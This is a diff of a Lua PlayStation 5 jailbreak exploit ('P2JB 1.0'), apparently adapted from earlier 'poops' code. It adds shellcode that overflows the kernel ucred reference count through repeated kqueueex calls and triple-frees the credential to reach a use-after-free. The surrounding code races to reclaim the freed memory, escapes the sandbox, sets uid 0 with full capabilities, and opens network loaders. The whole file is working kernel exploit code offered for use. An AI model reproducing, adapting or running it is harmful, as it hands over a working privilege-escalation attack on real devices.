@@ -1,5 +1,8 @@
--- poops ps5 port
+-- p2jb implementation
+-- based on poops_ps5.lua and p2jb.c by Gezine
 -- based on poops.lua (ps4) by egycnq
+
+p2jb_version_string = "P2JB 1.0"
 
 local UCRED_SIZE          = 360
 local RTHDR_TAG           = 0x13370000
@@ -16,6 +19,9 @@ local UMTX_OP_WAIT        = 2
 local UMTX_OP_WAKE        = 3
 local UMTX_OP_SYSNUM      = 0x1c6
 local SYSTEM_AUTHID        = 0x4800000000010003
+local FREE_FDS_NUM      = 0x10
+
+local EXEC_SHELLCODE = "4885f6743641544989fc554889f55331db66662e0f1f8400000000000f1f400048bf00000000008000004883c30141ffd44839dd75ea5b5d415cc3c3"
 
 -- Syscall wrapper helper
 local function get_syscall_wrapper(num)
@@ -144,23 +150,25 @@ local function build_rthdr(buf, target_size)
     return (segments + 1) << 3
 end
 
-function poops_ps5()
-    send_notification("Luac0re poops 1.3 by egycnq")
+function p2jb_ps5()
+    send_notification(p2jb_version_string)
 
     if not fw_offsets then
-        error("Update Luac0re to at least 2.2c version")
+        send_notification("Update Luac0re to at least 2.2d version")
+        return
     end
-    
+
     if gpu.close or kill_app then
-        error("Update Luac0re to at least 2.2c version")
+        send_notification("Update Luac0re to at least 2.2d version")
+        return
     end
 
     if PLATFORM ~= "PS5" then
         send_notification("Unsupported platform  " .. PLATFORM)
         return
     end
-    
-    if tonumber(FW_VERSION) > 12.00 then
+
+    if tonumber(FW_VERSION) > 12.70 then
         send_notification("Unsupported fw " .. FW_VERSION)
         return
     end
@@ -170,20 +178,28 @@ function poops_ps5()
         send_notification("Unsupported fw " .. FW_VERSION)
         return
     end
-    
-    if is_jailbroken() then
-        send_notification("Already Jailbroken")
-        return
+
+    local DEBUG_MODE = kkread32 ~= nil
+    if not DEBUG_MODE then
+        if is_jailbroken() then
+            send_notification("Already Jailbroken")
+            return
+        end
+
+        if file_exists("/savedata0/lua/elf_jb/elfldr_1200.elf") then
+            send_notification("Update Luac0re to at least 2.2d version")
+            return
+        end
+
+        local failcheck_path = "/" .. get_nidpath() .. "/common_temp/p2jb.fail"
+        if file_exists(failcheck_path) or file_exists("/user/temp/common_temp/p2jb.fail") then
+            send_notification("Restart your PS5 to run exploit again");
+            return
+        end
+
+        file_write(failcheck_path, "")
     end
 
-    local failcheck_path = "/" .. get_nidpath() .. "/common_temp/poops.fail"
-    if file_exists(failcheck_path) or file_exists("/user/temp/common_temp/poops.fail") then
-        send_notification("Restart your PS5 to run exploit again");
-        return
-    end
-    
-    file_write(failcheck_path, "")
-    
     init_dlsym()
 
     syscall.resolve({
@@ -194,13 +210,17 @@ function poops_ps5()
         readv = 0x78, writev = 0x79, getpid = 0x14, nmount = 0x17A,
         ioctl = 0x36,
     })
-    
+
     local fPC = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadCreate"))
     local fAI = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrInit"))
     local fAD = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrDestroy"))
     local fAS = func_wrap(dlsym(LIBKERNEL_HANDLE, "scePthreadAttrSetstacksize"))
     local fCpuset = func_wrap(dlsym(LIBKERNEL_HANDLE, "cpuset_setaffinity"))
     local fRtprio = func_wrap(dlsym(LIBKERNEL_HANDLE, "rtprio_thread"))
+
+    local kqueueex_addr = dlsym(LIBKERNEL_HANDLE, "__sys_kqueueex")
+    write_shellcode(SHELLCODE_BASE, EXEC_SHELLCODE)
+    local exec_ntimes = func_wrap(SHELLCODE_BASE)
 
     -- syscall wrappers for ROP chains
     local w_recvmsg = get_syscall_wrapper(0x1B)
@@ -617,39 +637,79 @@ function poops_ps5()
         return nil
     end
 
+    show_dialog("Stage Patience\nPlease wait for some time (~2 hours)")
+    local ucred = 0
+    local free_fds = {}
+    local free_fd_idx = 1
+
+    local function prepare_fds(debug_cr_ref)
+        -- Create clean ucred without any additional references
+        syscall.setuid(1)
+        -- Allow new ucred to settle where it needs to settle
+        sleep(10)
+
+        local cr_ref_before = 0
+        local cr_ref_after = 0
+        local cr_ref_after_files = 0
+        local cr_ref_final = 0
+        if debug_cr_ref then
+            ucred = kernel_get_proc_ucred(syscall.getpid())
+            cr_ref_before = kkread32(ucred)
+        end
+
+        -- Increment cr_ref by one with overflow
+        -- We want first fd free to be a normal free
+        local ntimes = 0x100000001 - FREE_FDS_NUM
+        if debug_cr_ref then
+            local ntimes_debug = 0x1000000
+            local cr_ref_after_increment = cr_ref_before + ntimes - ntimes_debug
+            kkwrite32(ucred, cr_ref_after_increment)
+            exec_ntimes(kqueueex_addr, ntimes_debug)
+            cr_ref_after = kkread32(ucred)
+        else
+            exec_ntimes(kqueueex_addr, ntimes)
+        end
+
+        -- Use fopen to get the rest of the cr_ref increment
+        for i = 1, FREE_FDS_NUM do
+            free_fds[i] = syscall.open("/dev/null")
+        end
+
+        if debug_cr_ref then
+            cr_ref_after_files = kkread32(ucred)
+        end
+
+        -- Replace ucred, freeing all extra references from old ucred
+        syscall.setuid(1)
+        -- Allow new ucred to settle where it needs to settle
+        sleep(10)
+
+        if debug_cr_ref then
+            cr_ref_final = kkread32(ucred)
+            printf("cr_ref before: %s", to_hex(cr_ref_before))
+            printf("cr_ref after: %s", to_hex(cr_ref_after))
+            printf("cr_ref after files: %s", to_hex(cr_ref_after_files))
+            printf("cr_ref final: %s", to_hex(cr_ref_final))
+        end
+    end
+
+    local function free_one_fd()
+        syscall.close(free_fds[free_fd_idx])
+        free_fd_idx = free_fd_idx + 1
+    end
+
+    prepare_fds(DEBUG_MODE)
+
     -- Stage 0: Triple-free race
     send_notification("Stage 0\nTriple-free race")
-    local uaf_socket = -1
     local race_success = false
 
     local function attempt_race()
         for i = 1, ipv6_count do free_rthdr(ipv6_sockets[i]) end
 
-        -- trigger ucred UAF via netcontrol
-        local discard_sock = create_socket(AF_UNIX, SOCK_STREAM, 0)
-        local sock_buf = malloc(8); write32(sock_buf, discard_sock)
-        
-        if syscall.netcontrol(-1, 0x20000003, sock_buf, 8) == 0 then
-            syscall.close(discard_sock)
-            syscall.setuid(1)
-    
-            uaf_socket = create_socket(AF_UNIX, SOCK_STREAM, 0)
-            syscall.setuid(1)
-    
-            local ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
-            syscall.netcontrol(-1, 0x20000007, ctrl_buf, 8)
-        else
-            syscall.netcontrol(1, 0x20000003, sock_buf, 8)
-            syscall.close(discard_sock)
-            syscall.setuid(1)
-    
-            uaf_socket = create_socket(AF_UNIX, SOCK_STREAM, 0)
-            syscall.setuid(1)
-    
-            local ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
-            syscall.netcontrol(1, 0x20000007, ctrl_buf, 8)
-        end
-        
+        -- Free ucred first time
+        free_one_fd()
+
         -- flush iov workers to stabilize
         for _ = 1, 32 do
             signal_iov()
@@ -658,11 +718,15 @@ function poops_ps5()
             syscall.read(iov_sock_a, dummy_byte, 1)
         end
 
-        local dup_fd = syscall.dup(uaf_socket)
-        if dup_fd > -1 then syscall.close(dup_fd) end
+        -- Free ucred second time
+        free_one_fd()
 
         local twins = find_twins(MAX_ROUNDS_TWIN)
-        if not twins then syscall.close(uaf_socket); return false end
+
+        if not twins then
+            print("failed to find twins")
+            return false
+        end
 
         -- free twin[2] rthdr and race to reclaim
         free_rthdr(ipv6_sockets[twins[2] + 1])
@@ -684,20 +748,29 @@ function poops_ps5()
             syscall.read(iov_sock_a, dummy_byte, 1)
         end
 
-        if not reclaimed then syscall.close(uaf_socket); return false end
+        if not reclaimed then
+            print("not reclaimed")
+            return false
+        end
         triplets[1] = twins[1]
 
-        dup_fd = syscall.dup(uaf_socket)
-        if dup_fd > -1 then syscall.close(dup_fd) end
+        -- Free ucred third time
+        free_one_fd()
         syscall.sched_yield()
 
         triplets[2] = find_triplet(triplets[1], -1, MAX_ROUNDS_TRIPLET)
-        if triplets[2] == -1 then syscall.close(uaf_socket); return false end
+        if triplets[2] == -1 then
+            print("triplets[2] == -1")
+            return false
+        end
 
         syscall.write(iov_sock_b, scratch_big, 1)
         triplets[3] = find_triplet(triplets[1], triplets[2], MAX_ROUNDS_TRIPLET)
         wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)
-        if triplets[3] == -1 then syscall.close(uaf_socket); return false end
+        if triplets[3] == -1 then
+            print("triplets[3] == -1")
+            return false
+        end
 
         return true
     end
@@ -716,7 +789,7 @@ function poops_ps5()
 
     -- Stage 1: Kqueue reclaim
     send_notification("Stage 1\nKqueue reclaim")
-    
+
     free_rthdr(ipv6_sockets[triplets[2] + 1])
     syscall.sched_yield(); syscall.sched_yield()
 
@@ -915,16 +988,14 @@ function poops_ps5()
         null_socket_rthdr(ipv6_sockets[i])
     end
 
-    -- detach uaf socket: bump refcount and zero all fd table entries
-    if uaf_socket >= 0 then
-        local uaf_fp = kread64(fd_ofiles + uaf_socket * OFF.FILEDESCENT_SIZE)
-        if uaf_fp ~= 0 and (uaf_fp >> 48) == 0xFFFF then
-            bump_refcount(uaf_fp, 0x100)
-            for fd = 0, 255 do
-                local fp = kread64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE)
-                if fp == uaf_fp then kwrite64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE, 0) end
-            end
+    -- close leftover free_fds
+    -- their ucred cr_ref should be 0x0000000016002C00 from rthdr
+    -- so it should be ok to close them
+    for i = free_fd_idx, FREE_FDS_NUM do
+        if ucred ~= 0 then
+            printf("cr_ref: %s", to_hex(kkread32(ucred)))
         end
+        syscall.close(free_fds[i])
     end
 
     -- close ipv6 sockets
@@ -1022,7 +1093,7 @@ function poops_ps5()
     -- escape sandbox
     kwrite64(proc_fd + OFF.FD_RDIR, rootvnode)
     kwrite64(proc_fd + OFF.FD_JDIR, rootvnode)
-    
+
     local verify_uid = kread32(proc_ucred + OFF.UCRED_CR_UID)
     if verify_uid == 0 then
         ulog("[5] jailbreak ok")
@@ -1086,6 +1157,17 @@ function poops_ps5()
     kwrite64(proc_ucred + OFF.UCRED_CR_SCECAPS1,  0xFFFFFFFFFFFFFFFF)
 
     load_elfldr()
+
+    local current_ip = get_current_ip()
+
+    if current_ip then
+        local lua_network_str = string.format("%s:%d", current_ip, 9026)
+        local elf_network_str = string.format("%s:%d", current_ip, 9021)
+        show_dialog(string.format("%s\n%s\nPlatform: %s\nFW: %s\nRemote Lua Loader\nListening: %s\nELF Loader\nListening: %s",
+            version_string, p2jb_version_string, PLATFORM, FW_VERSION, lua_network_str, elf_network_str))
+    else
+        show_dialog("Network not found")
+    end
 end
 
-poops_ps5()
+p2jb_ps5()
